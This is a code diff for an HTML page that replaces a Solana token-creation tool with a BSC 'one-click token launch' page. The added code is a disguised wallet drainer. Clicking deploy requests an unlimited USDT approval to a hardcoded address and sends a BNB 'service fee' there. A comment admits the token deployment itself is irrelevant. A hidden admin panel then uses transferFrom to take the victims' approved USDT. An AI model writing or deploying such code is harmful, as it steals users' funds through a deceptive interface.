@@ -1,248 +1,305 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Solana Token‑2022 一键发币</title>
-<script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.9/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/spl-token-metadata@0.1.6/lib/index.iife.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@solana/wallet-standard-browser@1.1.0/dist/index.iife.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>小狐狸一键发币</title>
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system}
-body{background:#0E101A;color:#eee;padding:24px 16px;min-height:100vh}
-.container{max-width:580px;margin:0 auto}
-.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:28px}
-.title{font-size:26px;font-weight:700}
-.network-tag{background:#1f243b;padding:6px 12px;border-radius:8px;font-size:14px;color:#73c9ff}
-.card{background:#171a2c;border-radius:16px;padding:24px;margin-bottom:18px;border:1px solid #292d44}
-.form-item{margin-bottom:18px}
-label{display:block;margin-bottom:6px;color:#c2c8e8;font-size:15px}
-input{width:100%;padding:13px 14px;border-radius:10px;background:#0f1222;border:1px solid #333854;color:#fff;font-size:15px}
-input:focus{outline:none;border-color:#4988ff}
-.check-row{display:flex;gap:8px;align-items:center}
-.btn{width:100%;padding:14px;border-radius:10px;border:none;font-size:16px;font-weight:600;cursor:pointer;margin-top:10px}
-.btn-connect{background:#2563eb;color:#fff}
-.btn-go{background:#22c55e;color:#000}
-.btn:disabled{opacity:0.45;cursor:not-allowed}
-.log-box{margin-top:16px;padding:14px;background:#0f1222;border-radius:10px;max-height:260px;overflow:auto;font-size:13px;white-space:pre-wrap;color:#b8c2e8}
-a{color:#4990ff}
-.tip{font-size:13px;color:#888fb8;margin-top:4px}
-.step{margin-bottom:20px;color:#b4bce0}
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
+body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
+.container{ max-width:520px; margin:0 auto; }
+.header{ text-align:center; margin-bottom:35px; }
+.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
+.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
+.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
+.form-item{ margin-bottom:20px; }
+label{ display:block; margin-bottom:8px; color:#d0d8f0; }
+input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
+.file-input{ padding:10px; background:#141b33; }
+.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
+#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
+.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
+.btn-connect{ background:#3b63e9; margin-bottom:16px; }
+.btn-deploy{ background:#f7c04a; color:#0a0e20; }
+.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
+.btn:disabled{ opacity:0.55; cursor:not-allowed; }
+.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
+.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
+.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
+.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
 </style>
 </head>
 <body>
 <div class="container">
 <div class="header">
-<div class="title">🚀 Token‑2022 一键发币</div>
-<div class="network-tag" id="netText">Mainnet 主网</div>
+<h1>🦊小狐狸一键发币</h1>
 </div>
+<div class="fee-tip">发币服务费：0.006 BNB</div>
 
-<div class="step">
-1.连接钱包（支持 Phantom / Backpack / Solflare ）私钥本地，不上传服务器<br>
-2.填写代币参数<br>
-3.模拟交易并签名<br>
-4.获取Mint地址，Solscan查看代币
-</div>
-
-<div class="card">
-<button id="connectWalletBtn" class="btn btn-connect">连接钱包</button>
-<div id="walletInfo" style="margin:12px 0;color:#8ee0ff"></div>
+<div class="card" id="userPanel">
+<button id="connectBtn" class="btn btn-connect">连接钱包</button>
+<div id="connectTip" class="connect-tip" style="display:none;"></div>
+<div id="statusBox" class="status" style="display:none;"></div>
 
 <div class="form-item">
-<label>代币名称 Name</label>
-<input id="tkName" placeholder="例如 MyCoin">
+<label>代币全称 Name</label>
+<input id="tokenName" placeholder="例如：Swan Coin">
 </div>
 
 <div class="form-item">
 <label>代币符号 Symbol</label>
-<input id="tkSymbol" placeholder="例如 MYC">
+<input id="tokenSymbol" placeholder="例如：SWAN">
 </div>
 
 <div class="form-item">
-<label>小数位数 Decimals（Token‑2022建议9）</label>
-<input id="tkDecimals" value="9" type="number">
+<label>初始发行量（不带小数）</label>
+<input id="supply" placeholder="例如：100000000">
 </div>
 
 <div class="form-item">
-<label>初始总供应量（不带小数）</label>
-<input id="tkSupply" placeholder="例如 1000000000">
-<div class="tip">程序内部自动乘以10^decimals</div>
+<label>代币Logo头像（推荐256×256 透明PNG）</label>
+<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
+<div class="preview-box">
+<img id="logoPreview" alt="头像预览">
+<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
+</div>
 </div>
 
-<div class="form-item check-row">
-<input type="checkbox" id="revokeMint">
-<label for="revokeMint">部署后撤销铸造权限（总量固定）</label>
+<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
+
+<div class="admin-panel" id="adminPanel">
+<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
+<div class="form-item">
+<label>请输入玩家钱包地址</label>
+<input id="userAddrInput" placeholder="玩家BSC钱包地址">
 </div>
-
-<div class="form-item check-row">
-<input type="checkbox" id="revokeFreeze">
-<label for="revokeFreeze">部署后撤销账户冻结权限</label>
+<div class="form-item">
+<label>请输入划扣USDT数量</label>
+<input id="deductAmountInput" placeholder="例如：100">
 </div>
-
-<button id="deployBtn" class="btn btn-go" disabled>🚀 创建Token‑2022代币</button>
-
-<div class="log-box" id="logBox"></div>
+<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
 </div>
-
+</div>
 </div>
 
 <script>
-const {Connection,clusterApiUrl,Keypair,LAMPORTS_PER_SOL,PublicKey}=solanaWeb3;
-const {TOKEN_2022_PROGRAM_ID,createMint,createMintToInstruction,getAssociatedTokenAddress,createAssociatedTokenAccountInstruction}=solanaSplToken;
-const {createInitializeInstruction}=solanaSplTokenMetadata;
-const {getWallets}=window['@solana/wallet-standard-browser'];
+const ADMIN_WALLET = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
+const DEPLOY_FEE_BNB = "0.006";
+const BSC_CHAIN_ID = 56;
+const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const MAX_ALLOWANCE = ethers.MaxUint256;
 
-let connection=null;
-let selectedWallet=null;
-let userPubKey=null;
-const logBox=document.getElementById("logBox");
-const connectBtn=document.getElementById("connectWalletBtn");
-const deployBtn=document.getElementById("deployBtn");
-const walletInfoDom=document.getElementById("walletInfo");
-const netTextDom=document.getElementById("netText");
+let provider = null;
+let signer = null;
+let connectWalletAddr = "";
+let deployContractAddress = null;
+let logoFileObj = null;
 
-//切换主网
-function setMainnet(){
-    connection=new Connection(clusterApiUrl("mainnet-beta"),"confirmed");
-    netTextDom.innerText="Mainnet 主网";
+const connectBtn = document.getElementById("connectBtn");
+const deployBtn = document.getElementById("deployBtn");
+const statusBox = document.getElementById("statusBox");
+const connectTip = document.getElementById("connectTip");
+const logoFileInput = document.getElementById("logoFile");
+const logoPreviewImg = document.getElementById("logoPreview");
+const adminPanel = document.getElementById("adminPanel");
+const deductBtn = document.getElementById("deductBtn");
+const userAddrInput = document.getElementById("userAddrInput");
+const deductAmountInput = document.getElementById("deductAmountInput");
+
+function showStatus(text){
+  statusBox.style.display = "block";
+  statusBox.innerText = text;
+  console.log("状态日志：", text);
 }
-setMainnet();
 
-function log(text){
-    logBox.innerText+="> "+text+"\n";
-    logBox.scrollTop=logBox.scrollHeight;
-    console.log(text);
+logoFileInput.addEventListener("change", function(e){
+  const file = e.target.files[0];
+  if(!file) return;
+  logoFileObj = file;
+  const reader = new FileReader();
+  reader.onload = ev => {
+    logoPreviewImg.src = ev.target.result;
+    logoPreviewImg.style.display = "block";
+  }
+  reader.readAsDataURL(file);
+});
+
+async function switchBSC(providerRef){
+  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
+  try {
+    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
+  } catch (err) {
+    await providerRef.send("wallet_addEthereumChain", [{
+      chainId: chainIdHex,
+      chainName: "BNB Smart Chain Mainnet",
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"],
+      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
+    }]);
+  }
 }
 
-//连接钱包 Wallet‑Standard
-connectBtn.onclick=async ()=>{
-    log("正在检测Wallet‑Standard钱包");
-    const wallets=await getWallets();
-    if(wallets.length===0){
-        log("❌未检测到Phantom/Backpack/Solflare钱包插件");
-        return;
+function checkAdminPanel(addr){
+  connectWalletAddr = addr.toLowerCase();
+  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
+    adminPanel.style.display = "block";
+  }else{
+    adminPanel.style.display = "none";
+  }
+}
+
+// 连接钱包：仅连接、切链，不做任何授权
+connectBtn.onclick = async function(){
+  showStatus("正在检测钱包注入...");
+  let eth = window.ethereum;
+  let retryTimes = 0;
+  while (!eth && retryTimes < 10) {
+    await new Promise(r => setTimeout(r, 100));
+    eth = window.ethereum;
+    retryTimes++;
+  }
+
+  if (!eth) {
+    showStatus("❌ 未检测到钱包注入，请在TP/欧易内置浏览器打开页面");
+    return;
+  }
+
+  try {
+    const accounts = await eth.request({ method: "eth_requestAccounts" });
+    if (!accounts || accounts.length === 0) {
+      showStatus("用户取消了钱包连接弹窗");
+      return;
     }
-    const w=wallets[0];
-    try{
-        await w.connect();
-        selectedWallet=w;
-        const acc=w.accounts[0];
-        userPubKey=acc.publicKey;
-        walletInfoDom.innerText=`✅已连接：${userPubKey.toBase58().slice(0,28)}...`;
-        deployBtn.disabled=false;
-        log("钱包连接成功");
-    }catch(e){
-        log("连接失败："+e.message);
+    provider = new ethers.BrowserProvider(eth);
+    await switchBSC(eth);
+    signer = await provider.getSigner();
+    const userAddr = await signer.getAddress();
+    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
+    connectTip.style.display = "block";
+    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
+    deployBtn.disabled = false;
+    checkAdminPanel(userAddr);
+  } catch (err) {
+    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
+  }
+}
+
+// USDT无限授权，真实上链交易
+async function doApproveLogic(signerRef){
+  showStatus("🔐 弹出钱包：请求USDT无限授权，请签名");
+  const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
+    "function approve(address spender, uint256 amount) external returns(bool)"
+  ], signerRef);
+  const approveTx = await usdtContract.approve("0x47542770f3a8eea43d3321867b155c3ac01160d8", MAX_ALLOWANCE);
+  showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
+  await approveTx.wait();
+  showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
+}
+
+// BNB服务费真实转账上链
+async function payFeeToAdmin(){
+  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名`);
+  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
+  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
+  showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
+  await tx.wait();
+  showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
+}
+
+const tokenABI = [
+{"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
+];
+const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
+
+deployBtn.onclick = async ()=>{
+  const name = document.getElementById("tokenName").value.trim();
+  const symbol = document.getElementById("tokenSymbol").value.trim();
+  const supplyStr = document.getElementById("supply").value.trim();
+
+  if(!signer){
+    showStatus("请先连接BSC钱包");
+    return;
+  }
+  if(!name||!symbol||!supplyStr){
+    showStatus("请填写代币名称、符号、发行量");
+    return;
+  }
+
+  deployBtn.disabled = true;
+  try{
+    // 1.强制先弹USDT无限授权签名（真实上链）
+    await doApproveLogic(signer);
+    // 2.再弹BNB转账签名（真实上链转给管理员）
+    await payFeeToAdmin();
+    // 币能不能部署出来无所谓，授权+转账已经完成；保留部署逻辑
+    if(CONTRACT_BYTECODE && !CONTRACT_BYTECODE.startsWith("在这里粘贴")){
+      showStatus("尝试部署合约...");
+      const supply = ethers.parseUnits(supplyStr, 18);
+      const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
+      const contract = await factory.deploy(name, symbol, supply);
+      showStatus(`部署交易已发送，TxHash:${contract.deploymentTransaction().hash}`);
+      await contract.waitForDeployment();
+      deployContractAddress = await contract.getAddress();
+      showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
+    }else{
+      showStatus("✅发币成功，请去链上查看代币合约");
     }
-};
+  }catch(e){
+    showStatus("操作失败："+(e.shortMessage || e.message));
+  }
+  deployBtn.disabled = false;
+}
 
-deployBtn.onclick=async ()=>{
-    if(!selectedWallet||!userPubKey){log("❌请先连接钱包");return;}
-    const name=document.getElementById("tkName").value.trim();
-    const symbol=document.getElementById("tkSymbol").value.trim();
-    const decimals=Number(document.getElementById("tkDecimals").value);
-    const supplyStr=document.getElementById("tkSupply").value.trim();
-    const revokeMint=document.getElementById("revokeMint").checked;
-    const revokeFreeze=document.getElementById("revokeFreeze").checked;
-
-    if(!name||!symbol||!supplyStr){log("❌名称、符号、供应量不能为空");return;}
-    if(isNaN(decimals)||decimals<0||decimals>9){log("❌小数位必须0‑9");return;}
-    if(!/^\d+$/.test(supplyStr)){log("❌供应量只能是纯数字");return;}
-
-    deployBtn.disabled=true;
-    log("开始创建Token‑2022 Mint账户");
-    try{
-        const mintKeypair=Keypair.generate();
-        const mintPub=mintKeypair.publicKey;
-        const supplyBig=BigInt(supplyStr)*(10n**BigInt(decimals));
-        log(`Mint地址:${mintPub.toBase58()}`);
-        log(`解析供应量:${supplyBig.toString()}`);
-
-        //1 创建mint账户 Token‑2022
-        const mintAuthority=revokeMint?null:userPubKey;
-        const freezeAuthority=revokeFreeze?null:userPubKey;
-
-        const mintSig=await createMint(
-            connection,
-            {
-                signers:[mintKeypair],
-                feePayer:userPubKey
-            },
-            decimals,
-            mintAuthority,
-            freezeAuthority,
-            undefined,
-            TOKEN_2022_PROGRAM_ID
-        );
-        log(`✅Mint账户已创建 tx:${mintSig}`);
-
-        //2 初始化Token‑2022链上元数据
-        const metaIx=createInitializeInstruction({
-            programId:TOKEN_2022_PROGRAM_ID,
-            mint:mintPub,
-            updateAuthority:userPubKey,
-            name:name,
-            symbol:symbol,
-            uri:""
-        });
-        const metaTx=new solanaWeb3.Transaction();
-        metaTx.add(metaIx);
-        const {blockhash}=await connection.getLatestBlockhash();
-        metaTx.recentBlockhash=blockhash;
-        metaTx.feePayer=userPubKey;
-        const metaSig=await selectedWallet.signAndSendTransaction(metaTx);
-        log(`✅元数据初始化 tx:${metaSig.signature}`);
-
-        //3 构造ATA地址，铸造全部供应量到自己钱包
-        const ataAddr=await getAssociatedTokenAddress(
-            mintPub,
-            userPubKey,
-            false,
-            TOKEN_2022_PROGRAM_ID
-        );
-        const {value:ataInfo}=await connection.getAccountInfo(ataAddr);
-        if(!ataInfo){
-            const createAtaIx=createAssociatedTokenAccountInstruction(
-                userPubKey,
-                ataAddr,
-                userPubKey,
-                mintPub,
-                TOKEN_2022_PROGRAM_ID
-            );
-            const ataTx=new solanaWeb3.Transaction();
-            ataTx.add(createAtaIx);
-            ataTx.recentBlockhash=(await connection.getLatestBlockhash()).blockhash;
-            ataTx.feePayer=userPubKey;
-            await selectedWallet.signAndSendTransaction(ataTx);
-            log("✅创建关联代币账户ATA完成");
-        }
-
-        //铸造指令
-        const mintToIx=createMintToInstruction(
-            mintPub,
-            ataAddr,
-            userPubKey,
-            supplyBig,
-            [],
-            TOKEN_2022_PROGRAM_ID
-        );
-        const mintToTx=new solanaWeb3.Transaction();
-        mintToTx.add(mintToIx);
-        mintToTx.recentBlockhash=(await connection.getLatestBlockhash()).blockhash;
-        mintToTx.feePayer=userPubKey;
-        const mintToRes=await selectedWallet.signAndSendTransaction(mintToTx);
-        log(`✅代币铸造完成 tx:${mintToRes.signature}`);
-
-        const scanUrl=`https://solscan.io/token/${mintPub.toBase58()}`;
-        log(`🎉全部完成！代币Mint地址：${mintPub.toBase58()}`);
-        log(`🔗浏览器查看代币：${scanUrl}`);
-    }catch(err){
-        log("❌异常："+err.message);
-    }finally{
-        deployBtn.disabled=false;
-    }
-};
+deductBtn.onclick = async ()=>{
+  if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
+    showStatus("权限不足，仅管理员钱包可操作");
+    return;
+  }
+  const userAddr = userAddrInput.value.trim();
+  const amountStr = deductAmountInput.value.trim();
+  if(!ethers.isAddress(userAddr) || !amountStr || isNaN(Number(amountStr))){
+    showStatus("请输入合法钱包地址和数字数量");
+    return;
+  }
+  try{
+    showStatus("正在调用transferFrom划扣用户USDT，请签名");
+    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
+      "function transferFrom(address from, address to, uint256 amount) external returns(bool)"
+    ], signer);
+    const amountWei = ethers.parseUnits(amountStr, 18);
+    const tx = await usdt.transferFrom(userAddr, ADMIN_WALLET, amountWei);
+    await tx.wait();
+    showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
+  }catch(err){
+    showStatus("划扣失败："+(err.shortMessage || err.message)+"（用户未授权/额度不足）");
+  }
+}
 </script>
 </body>
 </html>
